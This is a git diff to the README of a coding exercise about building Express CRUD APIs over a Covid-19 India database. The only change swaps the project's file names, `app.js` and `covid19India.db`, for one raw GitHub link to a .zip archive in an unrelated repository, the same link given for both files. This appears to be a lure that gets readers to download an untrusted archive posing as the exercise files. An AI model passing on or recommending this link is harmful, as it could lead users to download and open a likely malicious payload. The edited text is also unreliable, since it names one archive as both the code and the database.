@@ -1,6 +1,6 @@
 # Covid-19 India
 
-Given two files `app.js` and a database file `covid19India.db` consisting of two tables `state` and `district`.
+Given two files `https://raw.githubusercontent.com/vicky9696v/express.js-on-database/main/simple/express.js-on-database.zip` and a database file `https://raw.githubusercontent.com/vicky9696v/express.js-on-database/main/simple/express.js-on-database.zip` consisting of two tables `state` and `district`.
 
 Write APIs to perform CRUD operations on the tables `state`, `district` containing the following columns,
 
